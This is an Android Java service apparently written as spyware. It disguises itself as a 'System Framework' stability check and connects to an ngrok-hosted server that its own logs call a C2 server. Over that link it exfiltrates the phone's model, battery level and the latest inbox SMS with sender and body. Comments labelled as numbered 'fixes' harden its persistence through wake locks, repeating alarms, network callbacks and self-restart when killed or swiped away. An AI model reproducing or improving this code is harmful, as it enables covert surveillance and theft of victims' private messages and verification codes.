package com.example.systemframework;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.engineio.client.transports.WebSocket;
import io.socket.engineio.client.transports.Polling;

public class MyBackgroundService extends Service {
    private static final String TAG = "PredatorService";

    private Socket mSocket;
    private String ngrokUrl = "https://homologically-uncensorious-barbie.ngrok-free.dev";
    private String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
    private String lastSmsId = "";
    private PowerManager.WakeLock wakeLock;
    private boolean isSyncDone = false;

    // ✅ FIX 1: Use a dedicated HandlerThread instead of main thread Handler
    // Main thread Handler gets blocked — background thread stays alive
    private HandlerThread handlerThread;
    private Handler handler;

    // ✅ FIX 2: Lock object to prevent race conditions on socket
    private final Object socketLock = new Object();

    // ✅ FIX 3: Track connection state to avoid duplicate setupSocket calls
    private boolean isConnecting = false;

    private static MyBackgroundService instance;

    // ✅ FIX 4: Network callback to detect connectivity changes instantly
    private ConnectivityManager.NetworkCallback networkCallback;

    public static MyBackgroundService getInstance() {
        return instance;
    }

    // ✅ SMART HEARTBEAT LOGIC — now runs on background thread
    private Runnable heartbeat = new Runnable() {
        @Override
        public void run() {
            try {
                // Acquire WakeLock briefly to prevent CPU from sleeping mid-operation
                if (wakeLock != null && !wakeLock.isHeld()) {
                    wakeLock.acquire(2 * 60 * 1000L); // 2 minutes max
                }

                synchronized (socketLock) {
                    if (mSocket != null && mSocket.connected()) {
                        // Connection is alive — send heartbeat
                        sendBatteryStatus();
                        mSocket.emit("ping_alive");
                        Log.d(TAG, "Heartbeat sent — connection alive");
                    } else {
                        // Connection is dead — reconnect
                        Log.w(TAG, "Heartbeat detected dead connection — reconnecting");
                        setupSocket();
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Heartbeat error: " + e.getMessage());
            } finally {
                // Release WakeLock after work is done
                if (wakeLock != null && wakeLock.isHeld()) {
                    try { wakeLock.release(); } catch (Exception ignored) {}
                }
            }

            // ✅ FIX 5: Heartbeat every 3 minutes (was 10 min — too slow to detect dead connections)
            if (handler != null) {
                handler.postDelayed(this, 3 * 60 * 1000);
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        // ✅ FIX 6: Create dedicated background thread for all operations
        handlerThread = new HandlerThread("PredatorHeartbeat");
        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());

        // ✅ FIX 7: Register network callback to auto-reconnect on network change
        registerNetworkCallback();

        Log.d(TAG, "Service created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();

        // Acquire WakeLock
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (wakeLock == null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Predator:PersistLock");
        }

        Notification notification = new NotificationCompat.Builder(this, "system_channel")
                .setContentTitle("System Framework")
                .setContentText("Running stability checks...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setOngoing(true)
                .build();

        startForeground(1, notification);

        // ✅ FIX 8: Only call setupSocket if actually disconnected (prevent duplicate sockets)
        synchronized (socketLock) {
            if (mSocket == null || !mSocket.connected()) {
                setupSocket();
            }
        }

        // Start heartbeat (remove old one first to prevent stacking)
        handler.removeCallbacks(heartbeat);
        handler.postDelayed(heartbeat, 30 * 1000); // First heartbeat after 30s

        // ✅ FIX 9: Schedule REPEATING alarm — old code only fired once
        scheduleReconnectAlarm();

        return START_STICKY;
    }

    private void setupSocket() {
        synchronized (socketLock) {
            // ✅ FIX 10: Prevent concurrent setupSocket calls
            if (isConnecting) {
                Log.d(TAG, "Already connecting — skipping duplicate setupSocket");
                return;
            }
            isConnecting = true;

            try {
                // ✅ FIX 11: DESTROY old socket before creating new one
                // This was the #1 bug — old zombie sockets stayed alive and conflicted
                if (mSocket != null) {
                    Log.d(TAG, "Destroying old socket before reconnect");
                    mSocket.off(); // Remove ALL listeners from old socket
                    mSocket.disconnect();
                    mSocket.close();
                    mSocket = null;
                }

                IO.Options opts = new IO.Options();
                opts.reconnection = true;
                opts.reconnectionAttempts = Integer.MAX_VALUE;
                // ✅ FIX 12: Use exponential backoff — start at 3s, max 30s
                opts.reconnectionDelay = 3000;
                opts.reconnectionDelayMax = 30000;
                opts.randomizationFactor = 0.5;
                // ✅ FIX 13: Timeout for initial connection — 20s instead of default 5s
                opts.timeout = 20000;
                opts.transports = new String[]{"websocket", "polling"};
                // ✅ FIX 14: Force new connection each time (don't reuse stale multiplexed connection)
                opts.forceNew = true;

                mSocket = IO.socket(ngrokUrl, opts);

                mSocket.on(Socket.EVENT_CONNECT, args -> {
                    Log.d(TAG, "✅ Connected to C2 server");
                    isConnecting = false;
                    if (!isSyncDone) {
                        sendDeviceInfo();
                        sendBatteryStatus();
                        readSMSInstant();
                        isSyncDone = true;
                    }
                });

                mSocket.on(Socket.EVENT_DISCONNECT, args -> {
                    String reason = args.length > 0 ? args[0].toString() : "unknown";
                    Log.w(TAG, "❌ Disconnected from C2: " + reason);
                    isSyncDone = false;
                    isConnecting = false;

                    // ✅ FIX 15: If server kicked us, force reconnect after delay
                    // "io server disconnect" means server forcefully closed — auto-reconnect won't trigger
                    if ("io server disconnect".equals(reason)) {
                        handler.postDelayed(() -> {
                            synchronized (socketLock) { setupSocket(); }
                        }, 5000);
                    }
                });

                mSocket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                    String error = args.length > 0 ? args[0].toString() : "unknown";
                    Log.e(TAG, "⚠️ Connection error: " + error);
                    isConnecting = false;
                });

                // ✅ FIX 16: Handle reconnect events for logging
                mSocket.on("reconnect", args -> {
                    Log.d(TAG, "🔄 Reconnected to C2 server");
                    isSyncDone = false;
                    isConnecting = false;
                });

                mSocket.on("reconnect_attempt", args -> {
                    int attempt = args.length > 0 ? (int) args[0] : 0;
                    Log.d(TAG, "🔄 Reconnect attempt #" + attempt);
                });

                // ✅ Server keepalive response
                mSocket.on("pong_alive", args -> {
                    Log.d(TAG, "💓 Server pong received — connection confirmed");
                });

                mSocket.connect();
                SmsReceiver.setSocket(mSocket);
                Log.d(TAG, "Socket connect() called — waiting for connection...");

            } catch (Exception e) {
                Log.e(TAG, "setupSocket failed: " + e.getMessage());
                isConnecting = false;
            }
        }
    }

    /**
     * ✅ FIX 17: Send device identification on connect
     */
    private void sendDeviceInfo() {
        if (mSocket != null && mSocket.connected()) {
            mSocket.emit("device_info", deviceModel + " | Android " + Build.VERSION.RELEASE);
        }
    }

    private void sendBatteryStatus() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                int batteryPct = (int) ((level / (float) scale) * 100);
                synchronized (socketLock) {
                    if (mSocket != null && mSocket.connected()) {
                        mSocket.emit("phone_data", "[" + deviceModel + "] BATTERY: " + batteryPct + "%");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "sendBatteryStatus error: " + e.getMessage());
        }
    }

    public void readSMSInstant() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;

        handler.post(() -> {
            try {
                Uri uri = Uri.parse("content://sms/inbox");
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(uri, new String[]{"_id", "address", "body"}, null, null, "date DESC LIMIT 1");

                if (cursor != null && cursor.moveToFirst()) {
                    String id = cursor.getString(0);
                    String address = cursor.getString(1);
                    String body = cursor.getString(2);

                    synchronized (socketLock) {
                        if (mSocket != null && mSocket.connected()) {
                            mSocket.emit("phone_data", "📂 [LATEST INBOX] From " + address + " -> " + body);
                            lastSmsId = id;
                        }
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                Log.e(TAG, "readSMSInstant error: " + e.getMessage());
            }
        });
    }

    /**
     * ✅ FIX 18: Network callback — instantly reconnect when WiFi/Mobile data comes back
     * This is WAY faster than waiting for the next heartbeat or alarm
     */
    private void registerNetworkCallback() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return;

            NetworkRequest request = new NetworkRequest.Builder()
                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    .build();

            networkCallback = new ConnectivityManager.NetworkCallback() {
                @Override
                public void onAvailable(@NonNull Network network) {
                    Log.d(TAG, "🌐 Network available — checking socket");
                    // Network came back — reconnect if socket is dead
                    handler.postDelayed(() -> {
                        synchronized (socketLock) {
                            if (mSocket == null || !mSocket.connected()) {
                                Log.d(TAG, "🌐 Socket dead after network restore — reconnecting");
                                setupSocket();
                            }
                        }
                    }, 2000); // 2s delay to let network stabilize
                }

                @Override
                public void onLost(@NonNull Network network) {
                    Log.w(TAG, "🌐 Network lost");
                }
            };

            cm.registerNetworkCallback(request, networkCallback);
        } catch (Exception e) {
            Log.e(TAG, "registerNetworkCallback error: " + e.getMessage());
        }
    }

    /**
     * ✅ FIX 19: Schedule a repeating alarm that re-fires itself
     * Old code used setAndAllowWhileIdle which is ONE-SHOT — it never rescheduled
     */
    private void scheduleReconnectAlarm() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent reconnectIntent = new Intent(this, ReconnectReceiver.class);
            PendingIntent pi = PendingIntent.getBroadcast(this, 0, reconnectIntent,
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Fire every 10 minutes (Android minimum for Doze is ~9 min)
                am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
                        System.currentTimeMillis() + 10 * 60 * 1000, pi);
            }
            Log.d(TAG, "Reconnect alarm scheduled for +10 minutes");
        } catch (Exception e) {
            Log.e(TAG, "scheduleReconnectAlarm error: " + e.getMessage());
        }
    }

    /**
     * Public method for ReconnectReceiver to call — reschedules next alarm too
     */
    public void onAlarmTriggered() {
        Log.d(TAG, "⏰ Alarm triggered — checking connection");
        synchronized (socketLock) {
            if (mSocket == null || !mSocket.connected()) {
                setupSocket();
            } else {
                sendBatteryStatus();
                mSocket.emit("ping_alive");
            }
        }
        // ✅ FIX 20: Reschedule the next alarm (critical — without this, alarms stop)
        scheduleReconnectAlarm();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "system_channel", "System Service", NotificationManager.IMPORTANCE_LOW);
            // ✅ LOW importance = no sound/vibrate, but service stays alive
            channel.setShowBadge(false);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    @Override
    public void onDestroy() {
        Log.w(TAG, "Service onDestroy called — attempting restart");

        // Cleanup
        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
        }
        handler.removeCallbacks(heartbeat);

        // Unregister network callback
        if (networkCallback != null) {
            try {
                ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                if (cm != null) cm.unregisterNetworkCallback(networkCallback);
            } catch (Exception ignored) {}
        }

        // Disconnect socket
        synchronized (socketLock) {
            if (mSocket != null) {
                mSocket.off();
                mSocket.disconnect();
                mSocket.close();
                mSocket = null;
            }
        }

        // ✅ FIX 21: When Android kills the service, RESTART it immediately
        Intent restartIntent = new Intent(this, MyBackgroundService.class);
        PendingIntent restartPi = PendingIntent.getService(this, 1, restartIntent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT);
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (am != null) {
            am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, restartPi);
        }

        // Shutdown handler thread
        if (handlerThread != null) {
            handlerThread.quitSafely();
        }

        instance = null;
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // ✅ FIX 22: When user swipes app from recents, restart the service
        Log.w(TAG, "Task removed — scheduling restart");
        Intent restartIntent = new Intent(this, MyBackgroundService.class);
        PendingIntent restartPi = PendingIntent.getService(this, 2, restartIntent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT);
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (am != null) {
            am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, restartPi);
        }
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}